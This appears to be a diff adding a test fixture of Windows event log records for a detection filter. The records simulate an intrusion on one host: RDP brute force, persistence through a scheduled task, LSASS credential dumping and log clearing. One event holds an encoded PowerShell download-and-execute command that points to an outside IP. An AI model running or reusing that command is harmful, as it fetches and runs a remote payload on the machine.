@@ -1,0 +1,92 @@
+<Events>
+  <!-- 1. RDP Brute Force Attempt (T1110) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4625</EventID>
+      <TimeCreated SystemTime="2026-11-25T13:58:10.112Z" />
+      <Computer>CORP-FINANCE-04.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="TargetUserName">ajay.k</Data>
+      <Data Name="LogonType">10</Data>
+      <Data Name="IpAddress">91.240.118.172</Data>
+      <Data Name="Status">0xc000006d</Data>
+    </EventData>
+  </Event>
+
+  <!-- 2. Malicious Encoded PowerShell Execution (T1059.001) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4688</EventID>
+      <TimeCreated SystemTime="2026-11-25T14:02:11.412Z" />
+      <Computer>CORP-FINANCE-04.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">ajay.k</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentProcessName">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+      <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=</Data>
+    </EventData>
+  </Event>
+
+  <!-- 3. Benign Admin Activity (Should be suppressed by filter) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4688</EventID>
+      <TimeCreated SystemTime="2026-11-25T14:05:00.100Z" />
+      <Computer>CORP-FINANCE-04.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">admin_deploy</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="ParentProcessName">C:\Windows\System32\services.exe</Data>
+      <Data Name="CommandLine">powershell.exe -enc SQBFAFgAIAAoAEcAZQB0AC0AUwBlAHIAdgBpAGMAZQApAA==</Data>
+    </EventData>
+  </Event>
+
+  <!-- 4. Scheduled Task Persistence in AppData\Temp (T1053.005) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4698</EventID>
+      <TimeCreated SystemTime="2026-11-25T14:03:02.500Z" />
+      <Computer>CORP-FINANCE-04.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">ajay.k</Data>
+      <Data Name="TaskName">\Microsoft\Windows\UpdateOrchestrator\SysHealthSync</Data>
+      <Data Name="TaskContent">&lt;Exec&gt;&lt;Command&gt;C:\Users\ajay.k\AppData\Local\Temp\updater.exe&lt;/Command&gt;&lt;/Exec&gt;</Data>
+    </EventData>
+  </Event>
+
+  <!-- 5. LSASS Memory Credential Dumping (T1003.001) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" />
+      <EventID>10</EventID>
+      <TimeCreated SystemTime="2026-11-25T14:03:45.889Z" />
+      <Computer>CORP-FINANCE-04.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="SourceImage">C:\Users\ajay.k\AppData\Local\Temp\mimi.exe</Data>
+      <Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data>
+      <Data Name="GrantedAccess">0x1010</Data>
+    </EventData>
+  </Event>
+
+  <!-- 6. Security Audit Log Cleared (T1070.001) -->
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Eventlog" />
+      <EventID>1102</EventID>
+      <TimeCreated SystemTime="2026-11-25T14:06:19.004Z" />
+      <Computer>CORP-FINANCE-04.local</Computer>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">ajay.k</Data>
+    </EventData>
+  </Event>
+</Events>
